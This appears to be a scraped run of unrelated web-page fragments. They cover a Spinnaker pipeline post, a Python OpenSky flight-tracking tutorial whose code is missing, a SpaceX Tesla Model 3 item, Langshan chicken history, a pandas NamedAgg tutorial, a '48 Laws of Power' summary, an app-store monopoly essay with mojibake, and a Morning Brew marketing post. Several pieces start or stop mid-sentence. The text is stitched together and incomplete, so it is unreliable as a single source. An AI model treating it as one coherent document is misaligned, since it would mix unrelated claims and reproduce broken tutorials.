<li id="c461" data-selectable-paragraph=""><em>Less documentation and information sources</em>&nbsp;— this comes with any cutting-edge technology that is still fairly new, but there is not much out there on Spinnaker aside from the&nbsp;<a href="https://spinnaker.io/guides/" target="_blank" rel="noopener noreferrer">documentation</a>&nbsp;and&nbsp;<a href="http://join.spinnaker.io/" target="_blank" rel="noopener noreferrer">the official Slack channel</a>.</li>
<li id="ffc8" data-selectable-paragraph=""><em>Confusing error messages —&nbsp;</em>there are some known bugs that we stumbled upon that lead to confusing and misleading error messages when writing out our pipeline-templates.</li>
</ul>

<p id="c3b4" data-selectable-paragraph="">Spinnaker has given our team more runway to build out complex and robust deployment pipelines with ease. With more robust deployment pipelines, we are able to not inch, but begin running towards our goal of true …</p></div></div></section></div></div></div></section></main></div></div>

  <p>
    Tracking position of something is a topic that I like, cause it makes me
    feel like to be a human with a sixth sense. With this sense I know where an
    object is and how it moves, in spite of&nbsp; I can't see the object
    directly with my naked eyes. Then how do we get a sixth sense? Because as
    ordinary human we only have five senses.<br>
  </p>
  <p>
    In my opinion, living in this digital age today, we already had a sixth
    sense which is called technology that implemented in an application. Related
    with our topic in this post about flight tracking, there are numerous flight
    tracking applications out there such as flightradar24, FlightAware,
    flightview and so on, which enabled us to monitor position of airplanes
    around the earth. This post won't discuss about those applications, moreover
    I will discuss how to make our own flight tracking application with
    python.&nbsp; <br>
  </p>
  <p>
    Previously I already posted two tutorials about flight tracking with python.
    The first one is about
    <a href="https://www.geodose.com/2018/11/create-simple-live-flight-tracking-python.html">creating a simple flight tracking application with python</a>
    and the another one is
    <a href="https://www.geodose.com/2019/01/realtime-flight-tracking-pandas-bokeh-python.html">creating a flight tracking application with pandas and bokeh</a>. What is the difference with this one? The main difference is data source.
    In those two previous posts, I used
    <a href="https://www.adsbexchange.com/#" rel="nofollow" target="_blank">ADS-B Exchange</a>
    and in this tutorial I'm using
    <a href="https://opensky-network.org/" rel="nofollow" target="_blank">Opensky Network</a>. Another difference is module version. In this tutorial I'm using the
    latest version python library in particular for plotting library. So there
    will be a slight change in the code.
  </p>
  <p>
    Enough for introduction. Now let's move to our main topic how to build a
    flight tracking application with python using open air traffic data. This
    tutorial consists of several sub-topics, there are: Getting data, importing
    required libraries, loading basemap, plotting aircraft's position and make a
    "realtime" flight tracking application. We will discuss each part, and at
    the end of this tutorial we will get a flight tracking application which is
    running in a browser as shown in figure 1.

</div><h3>Getting Air Traffic Data

<ins data-ad-client="ca-pub-5632482621101280" data-ad-format="fluid" data-ad-layout="in-article" data-ad-slot="7655392618"></ins>
</h3>
<p>
  As I mentioned earlier, in this tutorial we are using open air traffic data
  from OpenSky Network. OpenSky Network is an non-profit consortium that
  provides open air traffic data to the public in particular for research and
  non-commercial purposes. The data can be accessed through REST API, Python API
  and Java API. In this tutorial we will use REST API to retrieve the live air
  traffic data.
</p>
<p>
  To retrieve the data using REST API can be done using request operation. There
  are two types of requests can be used. The first one is request for specific
  airplane based on time in UNIX timestamp or ICAO24 address. The second one we
  can get all airplane data within an area extent using WGS84 coordinates
  system. Moreover the access for the data can be done anonymously or registered
  user. For anonymously request, it has 10 seconds resolution and 5 seconds for
  registered user. <br>
</p>
<p>
  In this tutorial we will use the second one. We will define an area extent
  with minimum and maximum coordinates, and then send the query to get all
  airplane data within the area. For example we want to fetch the data over United States
  with minimum coordinate -125.974,30.038 and maximum coordinate -68.748,52.214. The query for both anonymously and registered user will be as follow.
</p>
<pre><span>#</span>Anonymously Request
https:<span>//</span>opensky<span>-</span>network.org<span>/</span>api<span>/</span>states<span>/</span><span>all</span><span>?</span>lamin<span>=30.038</span><span>&amp;</span>lomin<span>=-125.974</span><span>&amp;</span>&nbsp;</pre>
<pre>lamax<span>=52.214</span><span>&amp;</span>lomax<span>=-68.748</span><span></span>

<span>#</span>Registered User Request
https:<span>//</span>username:password<span>@</span>opensky<span>-</span>network.org<span>/</span>api<span>/</span>states<span>/</span><span>all</span><span>?</span>lamin<span>=</span><span>30.038</span><span>&amp;</span>lomin<span>=-125.974</span><span>&amp;</span>&nbsp;</pre>
<pre>lamax<span>=52.214</span><span>&amp;</span>lomax<span>=</span><span>-68.748</span><span></span></pre>
<p>
  Before continuing reading and to make sure the query is right, let's try it.
  Copy the anonymously query and paste into a browser. If you get a response
  like figure 2 below, then it works.&nbsp; <br>
</p>

      </td>
    </tr>
  </tbody>
</table>
<p>
  The return response as shown in figure 2 is in JSON structure with two keys.
  The first one is <i>time </i>and the second one is <i>States</i> that contains
  data for each airplane in a list array. The list array stores many data such
  as: ICAO24 address, airplane call sign, origin country, time position, last
  contact, longitude, latitude, barometer altitude and so on. For complete
  explanation about the data response and also further information about OpenSky
  Network API please refer to
  <a href="https://www.geodose.com/2020/08/OpenSky%20Network%20API" rel="nofollow" target="_blank">OpenSky Network API Documentation</a>. &nbsp; &nbsp;
</p>
<h3>Getting Air Traffic Data in Python</h3>

<p>
  We already retrieved the traffic data using REST API in a browser. Now let's
  do it in Python and process the response for the next purpose. For this
  tutorial I'm using Jupyter notebook with Python 3.8.2 and some libraries such
  as Bokeh 2.1.1, Pandas 0.25.3, requests, json and numpy. <br>
</p>
<p>
  Below is the code to make a request and do a little processing on the
  data. At the beginning, we import the required libraries such as requests,
  json and Pandas. Then define the extent coordinate in WGS84 with respective
  variable <i>lon_min,lat_min, lon_max and lat_max</i>.&nbsp; Based on the
  extent coordinate, make the request query. If you are a registered user, give
  the user name and password in <i>user_name</i> and <i>password</i> variable at
  line 11-12. Based on given extent coordinate and user data, we create a
  request query in <i>url_data</i> variable as in line 13 and get the response
  in json format. The remain of the code is used to dump the response data into
  Pandas data frame and replace the blank/empty data with 'NaN' value with 'No
  Data'. The last line which is data frame's <i>head</i> method is used to view
  the first 5 top row of the data as shown in figure 3. &nbsp;

&nbsp;
<p>Make sure after executing the code, you have a result as in figure 3. If you
  get it, it means everything is fine, and we have the data that will be used
  for the next step.</p><h3>Plotting Airplane on the Map</h3>
<p>
  After getting the data, now let's plot the location of all airplanes on a
  map.&nbsp; For plotting purpose, we are using Bokeh library. Therefore we need
  to import the library first. Additionally we also need to import NumPy library
  that will be used in coordinate conversion.
</p>
<p>
  The conversion of coordinate system is implemented in a function which is
  called <i>wgs84_web_mercator</i>_. As it's name this function will be used to
  transform WGS84 coordinate into web Mercator coordinate system. This
  transformation is required because we are using a
  <i>STAMEN_TERRAIN</i> basemap in a web browser that has web Mercator
  projection (EPSG: 3857).
</p>
<p>
  After creating coordinate conversion function and perform the transformation
  for data frame and extent coordinates. Next we set up plotting figure settings
  by specifying plotting area extent based on the range of x and y coordinates.
  The aircraft will be plotted on the basemap based on x and y coordinates with
  Points and also with airplane icon image. Why both point and image are used to plot
  the aircraft? Image will give a better visualization by using an airplane
  image and it can be rotated with the respective track angle. But unfortunately it
  can't&nbsp; high light a selected object and display more information with
  hover tool. To overcome this issue we use both image and point in circle
  object to get nice a visualization and enable selection and hovering tool.
  &nbsp; <br>
</p>
<p>
  The following is the code until this step. If it is
  executed we will get a result as in figure 4.&nbsp; <br>

<p>Collaboration between Elon Musk’s various companies is not a new thing, his space transportation company SpaceX often uses Tesla electric vehicles on the field wherever possible.</p>



<p>We saw <a href="https://www.teslaoracle.com/2020/05/27/crewdragon-human-spaceflight/">two Tesla Model X SUVs escorting NASA astronauts</a> for the SpaceX Demo-2 mission but they are not the only Tesla cars used by SpaceX.</p>



<p>A white Tesla Model 3 is performing services as an ‘Emergency Operations’ vehicle for SpaceX, it has been spotted on several occasions and SpaceX events. I have sourced some of these pictures that show its usage beyond a normal car for the end-customer.</p>



<p>For example, a SpaceX enthusiast and observer at the Boca Chica launch facility Mary (@BocaChicaGal) posted a stunning photo of the same <a href="https://www.teslaoracle.com/topic/model-3/">Tesla Model 3</a> with the SpaceX logo wrapped on the doors and equipped with the emergency vehicle lighting on the top.</p>

<p>This SpaceX Edition Model 3 was also spotted earlier this year at a <a href="https://www.teslaoracle.com/topic/spacex/">SpaceX</a> recruitment event at the company’s Boca Chica Texas office. It was enjoying all the attention while the Mariachi music and Mexican food were igniting the passion of the candidates even further.</p>



<figure></figure>



<p>When the huge Starship SN2 tank was returning to the assembly area on a rolling lift, the SpaceX Model 3 can be seen monitoring the situation at the back in a live video feed from Boca Chica earlier this year.</p>

<p>Integrating <a href="https://www.teslaoracle.com/">Tesla vehicles</a> into the SpaceX loop not only accelerates the mission of sustainable transportation but these electric cars are also helping humans reach goals beyond the planet.</p>

White Langshans were admitted to the quality ten years later in 1893. There are three sorts of Langshans that are accepted to the US standard – Black, White, and Blue. The latter wasn’t accepted to the quality until 1987.</p><p>In 1879 the breed was delivered to Germany. The German Langshans were derived from these and shortly replaced them.

<p>It is relatively old now, but on version 0.25, <code>pandas</code> introduced <code>NamedAgg</code>. It is mostly a convenience, it's not <strong>huge</strong>, but for me, it's life-changing.<br>
The <code>as</code> keyword from SQL is a wonderful one. You can create a complex function on a database column, and then give it an explicit name. This name can be used later in the pipeline as a reference, or even just as-is for convenience when reading the table.<br>
<code>pandas</code>, even though superior to SQL in so many ways, really lacked this until fairly recently. You either do a renaming stage, after receiving multi-index columns or feed the <code>agg</code> function with a complex dictionary structure. With <code>NamedAgg</code>, it becomes as easy as the <code>as</code> keyword, and in my mind, even more elegant.</p>

<p>Pandas <code>.groupby</code> always had a lot of flexability, but it was not perfect. Until lately. Let's start with the basics.
If you just want one aggregation function, and it happens to be a very basic one, just call it.</p>

<p>Notice how pandas created a <code>MultiIndex</code> on the columns. A <code>MultiIndex</code> has many advantages for efficiency, but when we are exploring data on reasonably sized datasets, they are harder to work with. I'd rather have a flat index. Flat indices are much easier to work with as they have very explicit means of accessing.
Also, maybe I don't need <strong>all</strong> functions on <strong>all</strong> columns? Perhaps I only need the sum of alcohol and the count of hue?</p>

<h2 id="Replacing-the-as-keyword-from-SQL">Replacing the <code>as</code> keyword from SQL<a href="#Replacing-the-as-keyword-from-SQL">¶</a></h2><p>SQL provides an important keyword when using <code>group by</code>. The <code>as</code> keyword essentially lets you call whichever aggregation function you want. If I want two different aggregation functions,  on two separate columns, simply write the functions and give them a new name.</p>
<div><pre><span></span><span>SELECT</span> <span>class</span><span>,</span> <span>sum</span><span>(</span><span>alcohol</span><span>)</span> <span>as</span> <span>sum_alcohol</span><span>,</span> <span>count</span><span>(</span><span>hue</span><span>)</span> <span>as</span> <span>count_hue</span>
<span>from</span> <span>df</span>
<span>group</span> <span>by</span> <span>class</span>
</pre></div>
<p>It used to be hard replicating that. You needed a very confusing dictionary structure that looked like this</p>
<div><pre><span></span><span>df</span><span>.</span><span>groupby</span><span>(</span><span>'class'</span><span>)</span><span>.</span><span>agg</span><span>({</span>
    <span>'alcohol'</span><span>:</span> <span>{</span>
        <span>'sum_alcohol'</span><span>:</span> <span>'sum'</span>
    <span>},</span>
    <span>'hue'</span><span>:</span> <span>{</span>
        <span>'count_hue'</span><span>:</span> <span>'count'</span>
    <span>}</span>
<span>})</span>
</pre></div>
<p>It would have worked, but first of all, it's pretty not very elegant with all those nested dicts, and it would still return a <code>MultiIndex</code> on the columns.<br>
The solution comes with <code>pd.NamedAgg</code>. The way to use it is still with the agg function, which now accepts <code>**kwargs</code>. Just provide it with a <code>NamedAgg</code> using the following template.</p>
<table>
<thead><tr>
<th>Language</th>
<th>Syntax</th>

<tbody>
<tr>
<td>SQL</td>
<td><code>f(column) as my_column name</code></td>

<p>But as you can observe, we remain with a <code>MultiIndex</code> on columns and a column named <code>&lt;lambda_0&gt;</code>. Renaming this, and would be hell. Imagine reading your own code 6 months from now, when you suddenly meet this line: <code>df.rename(columns={'&lt;lambda_0&gt;':'geomean'})</code>.  Blah 🤢.
<code>pandas</code> will give it a readable name if you use <code>def function(x):</code> but, that may sometimes have the overhead of writing small unnecessary functions.
<code>NamedAgg</code> takes care of all this hassle. It can easily be fed lambda functions with names given on the <code>agg</code> method.</p>

<h2 id="You-don't-really-need-pd.NamedAgg">You don't really need <code>pd.NamedAgg</code><a href="#You-don't-really-need-pd.NamedAgg">¶</a></h2><p>In reality, if you feed <code>agg</code> with many <code>**kwargs</code>, all have a parameter name and <code>tuple</code> as a value, maybe there's no need to write <code>pd.NamedAgg</code> every time?<br>
Indeed, <code>NamedAgg</code> more than being an API innovation, it's a framework innovation. It is its own class, but this class is more of a blueprint.</p>

<p>You can see that it can be instantiated with a non-existing function, on a non-existing column name, without a dataframe. It will only try to work inside an aggregation.
The <code>agg</code> method is smart enough. When given many <code>**kwargs</code> as tuples, it knows it should instantiate them as <code>NamedAgg</code>s. And this is where it ends, with this beautiful <code>groupby</code> aggregation, that finally, truly replaces the <code>as</code> keyword from SQL.</p>

<p>Water flows downhill. We all know this, and we all (implicitly) understand the idea. Water is flexible and subject to the forces of gravity. Terrain has high points and low points. Water follows the path of least resistance to reach its destination.</p>



<p>Water isn’t the only thing that behaves in this way. I think people behave in an identical fashion. Once the <a href="https://garybasin.com/no-motivation-without-vision/">destination</a> is determined and “terrain” is clearly visible, the path of least resistance becomes obvious. Unlike water, though, humans have to define the final resting point as precisely as possible. <strong>If you don’t define <em>it</em>, it may define <em>you</em></strong>: you will find yourself moving towards a destination you didn’t expect, and may not want.</p>



<p>You <em>will</em> flow along a path of least resistance. The key question is where do you want to end up? <a href="https://twitter.com/garybasin/status/1300428590530600963">If multiple paths seem equally appealing</a>, you may have not defined the destination with enough clarity.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><h2><span>Overall Thoughts</span></h2></p> <p><span>48 Laws of Power is a collection of tactics for attaining power in various domains in life. It may come off as amoral, and some of the tricks outlined in the book are shady to say the least. It is a tough pill to swallow. But it is an informative and engaging book, if you read it without value judgement. Less of a wholesome guide on how to live life, more of a disappassionate analysis of ways to obtain power. And here's the way the author Robert Greene himself puts it: "I'm not evil. I'm a realist."</span></p>  <p><h2><span>Summary</span></h2></p> <p><span>Below is the the list of the 48 laws detailed in the book, along with any important notes.</span></p> <p><h3><span>Law 1: Never outshine the master</span></h3></p> <p><strong>Make your masters appear more brilliant than they are</strong> <span> and you will attain the heights of power.</span></p> <p><span>As you try to impress your masters, do not go too far in displaying your talents. Otherwise, you will inspire fear and insecurity.</span></p>  <p><h3><span>Law 2: Never put too much trust in friends, learn how to use enemies</span></h3></p> <p><span>Be wary of friends. </span> <strong>You have more to fear from friends than from enemies</strong> <span>. If you have no enemies, find a way to make them.</span></p> <p><span>Friends will betray you more quickly, as envy makes things tricky. But hire a former enemy and he will be more loyal than a friend, because he has more to prove. </span></p>  <p><h3><span>Law 3: Conceal your intentions</span></h3></p> <p><strong>Keep people off-balance and in the dark.</strong> <span> Never reveal the purpose behind your actions. </span></p> <p><span>Hide your intentions not by closing up but&nbsp;</span> <strong>by talking endlessly about your desires and goals (just not your real ones)</strong> <span>. These are smoke screens that can disguise your actions.</span></p> <p><span>If they have no clue what you are up to, they cannot prepare a defense. </span></p>  <p><h3><span>Law 4: Always say less than necessary</span></h3></p> <p><strong>The more you say, the more common you appear</strong> <span>, and the less in control. Even if you are saying something banal, it will seem original if you make it vague, open-ended, and sphinxlike.</span></p> <p><span>You can't take back words once they are out. Keep them under control. The more you say, the more likely you are to say something foolish. </span></p>  <p><h3><span>Law 5: So much depends on reputation. Guard it with your life</span></h3></p> <p><strong>Through reputation alone you can intimidate and win</strong> <span>. It is the foundation of power.</span></p> <p><span>Always be alert to potential attacks and thwart them before they happen. Meanwhile, </span> <strong>learn to destroy your enemies by opening holes in their own reputations</strong> <span>. Then stand aside and let public opinion hang them. Doubt is a powerful weapon.</span></p>  <p><h3><span>Law 6: Court attention at all cost</span></h3></p> <p><strong>Stand out. Be conspicuous, at all cost</strong> <span>. It is better to be attacked than be ignored, for what is unseen counts for nothing. Never let yourself get lost in the crowd or buried in oblivion. Attach your name and reputation to an image larger, more colorful, and mysterious than other people.</span></p>  <p><h3><span>Law 7: Get others to do the work for you, but always take the credit</span></h3></p> <p><strong>Use other people to further your own cause</strong> <span>. It saves you valuable time and resources. Never do yourself what others can do for you. Your helpers wil lbe forgotten, and you will be remembered. </span></p>  <p><h3><span>Law 8: Make other people come to you. Use bait if necessary</span></h3></p> <p><span>It is always wise to </span> <strong>make your opponent come to you</strong> <span>, and have them abandon their own plans in the process. Fight the battle on your turf. When you force the other person to act, you are the one in control. Lure them into your territory with a potential victory, then attack. </span></p>  <p><h3><span>Law 9: Win through your actions, never through an argument</span></h3></p> <p><span>Any short-lived victory you think you gain through argument is an illusion, as resentment builds up. It is more powerful to get other people to agree with you through your actions, instead of your words. </span></p> <p><span>Show, don't tell. </span></p>  <p><h3><span>Law 10: Infection: Avoid the unhappy and unlucky</span></h3></p> <p><strong>The unfortunate sometimes draw misfortune on themselves.</strong> <span> They will also draw it on you. Don't try to help an infector, or you will pay the price. Helping the drowning man only sets you up for a disaster. You can die from someone else’s misery.</span></p>  <p><h3><span>Law 11: Learn to keep people dependent on you</span></h3></p> <p><span>Make people depend on you for their happiness and prosperity. Teach a man how to&nbsp;fish&nbsp;and you feed him for his life time. Don't. To maintain your independence you must always be needed and wanted. </span></p>  <p><h3><span>Law 12: Use selective honesty and generosity to disarm your victim</span></h3></p> <p><strong>One sincere and honest move will cover over dozens of dishonest ones</strong> <span>. Even the most suspicious people can be disarmed with gestures of generosity and honesty. Once they let their guard down, you can manipulate them at will.</span></p>  <p><h3><span>Law 13: When asking for help, appeal to people’s self-interest, never to their mercy or gratitude</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 14: Pose as a friend, work as a spy</span></h3></p> <p><span>Know your enemies. Learn to probe for other people's weaknesses and intentions. Every occasion is an opoprtunity to spy. </span></p>  <p><h3><span>Law 15: Crush your enemy totally</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 16: Use absence to increase respect and honor</span></h3></p> <p><strong>The more you are seen and heard from, the more common you appear</strong> <span>. You must learn when to leave. Create value through scarcity.</span></p>  <p><h3><span>Law 17: Keep others in suspended terror: Cultivate an air of unpredictability</span></h3></p> <p><strong>Be deliberately unpredictable</strong> <span>. Patterns are powerful, and you can keep others off-balance by disrupting the predictability. They will wear themselves out trying to explain your moves. </span></p>  <p><h3><span>Law 18: Do not build fortresses to protect yourself. Isolation is dangerous</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 19: Know who you’re dealing with. Do not offend the wrong person</span></h3></p> <p><span>Not everyone will react to your actions the same way. There are so many different kinds of people after all. Pick your battles, choose your rivals carefully.</span></p>  <p><h3><span>Law 20: Do not commit to anyone</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 21: Play a sucker to catch a sucker. Seem dumber than your mark</span></h3></p> <p><span>Make your victims feel smart. Make them feel smarter than you are. Once they believe this is true, they will not be able to detect your ulterior motives.</span></p>  <p><h3><span>Law 22: Use the surrender tactic: transform weakness into power</span></h3></p> <p><strong>Surrender first</strong> <span>. Turn the other cheek.  Resist the temptation to fight back for honor's sake. That will throw off the aggressor.</span></p>  <p><h3><span>Law 23: Concentrate your forces</span></h3></p> <p><span>Focus. Intensity is the name of the game. Don't spread your energy too thin.</span></p>  <p><h3><span>Law 24: Play the perfect courtier
</span></h3></p> <p><span>Practice flattery and nonchalance. Yield to those who are more powerful. Assert power over others in the most graceful manner. Master your emotions. Never be the bearer of bad news.</span></p>  <p><h3><span>Law 25: Recreate yourself
</span></h3></p> <p><span>Take control over your own image, or others will. Forge a new identity that commands attention. </span></p>  <p><h3><span>Law 26: Keep your hands clean
</span></h3></p> <p><span>Hide your mistakes, or use a scapegoat to conceal your involvement. You must maintain a flawless appearance.</span></p>  <p><h3><span>Law 27: Play on people’s need to believe to create a cultlike following
</span></h3></p> <p><span>Keep it vague, but full of promise. Promote passion over rationality. </span></p>  <p><h3><span>Law 28: Enter action with boldness
</span></h3></p> <p><strong>Timidity is dangerous</strong> <span>. People admire the bold.</span></p>  <p><h3><span>Law 29: Plan all the way to the end
</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 30: Make your accomplishments seem effortless
</span></h3></p> <p><strong>Act effortlessly, as if you could do much more</strong> <span>. </span></p>  <p><h3><span>Law 31: Control the options. Get others to play with the cards you deal
</span></h3></p> <p><span>Rig the game. Change the playing field in your favour. Your opponents will get a false sense of control, but you will come out on top regardless of which option they choose.</span></p>  <p><h3><span>Law 32: Play to people’s fantasies
</span></h3></p> <p><span>Life is tough. People want to believe there is something or someone to blame. Give them what they want.</span></p>  <p><h3><span>Law 33: Discover each man’s thumbscrew
</span></h3></p> <p><strong>Everyone has a weakness, a gap in the castle wall</strong> <span>. Once you find it, you can turn it to your advantage. What other people can't control, you control for them.</span></p>  <p><h3><span>Law 34: Be royal in your own fashion: Act like a king to be treated like one
</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 35: Master the art of timing
</span></h3></p> <p><span>Always appear patient and in control. You never want to be seen to be in a hurry. </span></p>  <p><h3><span>Law 36: Disdain things you cannot have: Ignoring them is the best revenge
</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 37: Create compelling spectacles
</span></h3></p> <p><span>Create spectacles for the people around you. This creates the aura of power around you.</span></p>  <p><h3><span>Law 38: Think as you like but behave like others
</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 39: Stir up waters to catch fish
</span></h3></p> <p><span>Never be angry or emotionally stirred, for they are counter-productive. However, if you can make your rivals angry while remaining calm yourself, it is a huge advantage. </span></p>  <p><h3><span>Law 40: Despise the free lunch
</span></h3></p> <p><strong>Pay the full price, as there is no cutting corners with excellence.</strong></p>  <p><h3><span>Law 41: Avoid stepping into a great man’s shoes
</span></h3></p> <p><span>Getting lost in a great man's shadow is a dangerous trap. Build a name for yourself, on your terms. Tread your own path.</span></p>  <p><h3><span>Law 42: Strike the shepherd and the sheep will scatter
</span></h3></p> <p><span>Trouble can usually be traced to a single source. If you let them be, they will infect the group with their ill will. Get rid of them before giving them the chance to do so.</span></p>  <p><h3><span>Law 43: Work on the hearts and minds of others
</span></h3></p> <p><span>Play on what people fear, and dropping their guards by playing on what they hold dear. Don't coerce. Go along with what others' emotions.</span></p>  <p><h3><span>Law 44: Disarm and infuriate with the mirror effect
</span></h3></p> <p><span>The mirror effect: </span> <strong>By holding up a mirror to their psyches, you seduce them with the illusion that you share their values</strong> <span>. This is powerful, and few can resist it.</span></p>  <p><h3><span>Law 45: Preach the need for change, but never reform too much at once
</span></h3></p> <p><span>No notes.</span></p>  <p><h3><span>Law 46: Never appear too perfect
</span></h3></p> <p><span>Envy is dangerous. One way to to eliminate envy is to </span> <strong>appear human and relatable</strong> <span>. It is wise to appear vulnerable and admit to defects occasionally.</span></p>  <p><h3><span>Law 47: Do not go past the mark you aimed for. In victory, learn when to stop
</span></h3></p> <p><span>Leave on a high note. Don't let hubris blind you and trap you into pushing past what you had aimed for. When you reach a goal, stop. "Stop gain" is just as important as "stop loss".</span></p>  <p><h3><span>Law 48: Assume formlessness
</span></h3></p> <p><strong>By taking a shape, you open yourself to attack</strong> <span>. Instead, remain adaptable, remain on your toes. Accept that change is the only constant. Be like water. </span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<p>Imagine a natural road spontaneously forms between point A and point B, and that as a consequence of this road, individuals suddenly wake up to the importance of point B, and of traveling there. Companies had first ignored point B altogether, but because the overwhelming majority of individuals now travel this road, these companies must now begin meeting individuals where they are: at point B. If they donâ€™t, they will perish.</p>

<p>But then comes along a wonderful invention: a road between point A and point B, but built on Conveyer Belt technology by the iCompany. Anyone traveling on the iRoad will arrive to B in 1/10th the time of the natural road. At first, the toll for individuals is far too pricey, so they disregard the iRoad; individuals are ok with the time cost of taking the natural road. But as time passes, more and more people begin taking the iRoad due to its undeniable benefits. Time turned out to be just one factor. Journeyers on the iRoad experience benefits like reduced health risk, less wear and tear, and an all around more comfortable experience. At some point, <em>not</em> taking the iRoad becomes of great consequence to individuals. Taking the natural road becomes no longer an option.</p>

<p>The benevolent iCompany has done a great service for humankind building this road that has completely changed the way people get to point B. And because the iCompany knows that other companies would love to travel this road just the same to cater to all its journey-goers, it charges them a hefty toll for access. It says, â€œanything you sell to people on this road, we will take a meaningful percent of, in perpetuity, forever and ever.â€�</p>

<p>Sellers on the iRoad grimace once at the terms of the deal, but sign nonetheless, knowing that not being able to sell to journeyers on the iRoad means their business will cease to exist. They can go and sell to riders of the natural road, but it isnâ€™t enough to guarantee a meaningful existence.</p>

<p>Over the days, months, and years, sellers go through a whirlwind of survival challenges all to put on a smile of a face to its customers on the iRoad, whom they can only meet through frosted glass. Throughout all the changes, mutations, and evolutions, one thing remains beautifully constant: the iRoad commission. It is the axiom of existence on the iRoad.</p>

<p>Merchants on the iRoad have for years felt the commission too high, and an impediment to their survival. But what can they do? Fight the iRoad, and risk being barred. Avoid the iRoad altogether, and immediately perish. Build your own iRoad, and fail.</p>

<p>Building an iRoad is of course no easy feat. In fact, only two companies in the history of the world have succeeded in doing so. The other such road, the gRoad, exists parallel to the iRoad, and funnily enough, charges the exact same toll. </p>

<p>Itâ€™s almost as if these two roads have a <em>monopoly</em> over access to passengers traveling to point B. We can say this because:</p>

<ul>
<li>Individuals can ignore point B at their own peril</li>
<li>Companies can ignore point B at their own peril</li>
<li>The only way to get to point B is via one of two roads</li>
<li>Building your own road is historically impossible and impractical</li>
<li>Both roads charge the same commission and are unwilling to negotiate</li>
<li>This commission is often seen as egregiously excessive</li>
</ul>

<p>In non-monopolistic cases, there would be many, many more roads to point B. And because individuals can choose which roads to travel, these roads compete to a point where commissions and tolls are reduced to their lowest natural level.</p>

<p>In cases of monopolies, there is no competition. And thus no real reason to lower prices, especially for a good as important as access to point B.</p>

<p>There are two common arguments one sees over this epic battle:</p>

<ol>
<li>The Textbook Libertarian: <em>"If youâ€™re not happy with the fee donâ€™t use the road."</em> As mentioned, one cannot simply ignore this road. This response is equivalent to <em>"Donâ€™t exist"</em>, but I think things that exist want to stay in existence. So this is ultimately too nihilistic a response.</li>
<li>The Textbook Retailer: "<em>All roads charge tolls."</em> Sure, almost all roads will levy a toll. The difference is that traveling most roads is optional. Point B however is special. Very, very special. So special that if you ignore it you will perish. And there are only two roads you can travel to get to point B. These two roads appear to act in unison to maintain what sellers deem unreasonably high tolls.</li>
</ol>

<p>Itâ€™s extremely important to understand what differentiates this case from any other case where you can successfully apply The Textbook Libertarian and The Textbook Retailer:</p>

<p><em>Monopoly.</em></p>

<p>The constricting of competition.</p>

<p>The complete suffocation of choice.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-768591a489fac6dfd3c8"><div><p>Two of my favorite follows on Twitter are <a href="https://twitter.com/tobydoyhowell">Toby Howell</a>, writer for the Morning Brew, and <a href="https://twitter.com/BUSlNESSBARISTA?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Alex Liberman</a>, CEO and co-founder of the Morning Brew. Recently, they announced a competition  — who would get to 10,000 followers first. The idea wasn't only a smart idea, but an idea rooted in authenticity.</p><p>If you are an avid reader of the <a href="https://www.morningbrew.com/">Brew</a>, a newsletter-firs media company, or a follower of them on social media, you'll notice a distinct voice. Their content is concise, playful, but always authentic. Here's an <a href="https://www.morningbrew.com/daily/stories/2020/08/31/zooms-revenue-increases-355-second-quarter">example</a>:</p><blockquote><p><em>“Zoom’s revenue grew 355% in Q2, because last year you hadn’t heard of the company and now you use it to watch your brother get married.” </em></p></blockquote><p>A publication like the Wall Street Journal would've just reported the number. The Morning Brew adds their own voice to it that makes the content special. </p><p>Special content is hard to come by  —  that's why two million people subscribe to their newsletter. When you open their email, you'll either be informed or entertained, but never disappointed. </p><p>This quality isn't just present in their content, but in their employee's content. Morning Brew employees have done an excellent job of forging their own path on social media. Alex Liberman has built a LinkedIn following of over 40,000 followers. <a href="https://twitter.com/austin_rief">Austin Rief</a>, COO and Co-Founder, of Morning Brew has built a following of over 18,000. Which brings be back to the Twitter game.</p><p>Many companies use referral programs and gamification to boost their following. It's been a common practice for years way before the internet. But there is a right way and wrong way to do it. In 2011, Google News introduced Google Badges, a reward system for reading the news. It was universally panned. Tech Crunch <a href="https://techcrunch.com/2011/07/15/google-news-badges-we-dont-need-no-stinking-google-news-badges/">wrote</a>:</p><blockquote><p><em>“Whether you think </em><a href="http://en.wikipedia.org/wiki/Gamification"><em>gamification</em></a><em> is the road that leads to a brighter future – or instead straight to the irreparable infantilization – of the Web, even the harshest of critics have to admit that there’s more to the concept than simply slapping some badges on a website, game or application, Foursquare-style. The more I </em><a href="http://googlenewsblog.blogspot.com/2011/07/shareable-google-news-badges-for-your.html"><em>read up</em></a><em> on this new </em><a href="http://news.google.com/support/bin/answer.py?hl=en&amp;answer=1237021"><em>Google News Badges</em></a><em> stuff, the more I think some people over at Mountain View didn’t quite get that particular message.”</em></p></blockquote><p>But for Morning Brew, gamification has been at the forefront of their brand. Case and point is their referral program which has brought in more than 225,000 subscribers to their newsletter. <a href="https://twitter.com/denk_tweets?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Tyler Denk</a>, the lead engineer behind the program, <a href="https://medium.com/the-mission/how-morning-brews-referral-program-built-an-audience-of-1-5-million-subscribers-3315482c1aa5">wrote an excellent summary</a> of it. </p><p>You never doubted the authenticity of the battle when Toby and Alex launched this competition, Twitter users such as <a href="https://twitter.com/APompliano">Anthony Pompliano</a>,  <a href="https://twitter.com/polina_marinova">Polina Marinova Pompliano</a> and <a href="https://twitter.com/JuiceboxCA">Jack Appleby</a> chose sides. This amplified it. Instead of it being a contest between Alex and Toby, it was a battle that enlisted the help of a variety of different Twitter users.</p><p>Authenticity rules the day. It's been a recurring theme in my articles. The companies that win tell the truth and remain consistent in their culture. Consider taking a page from the 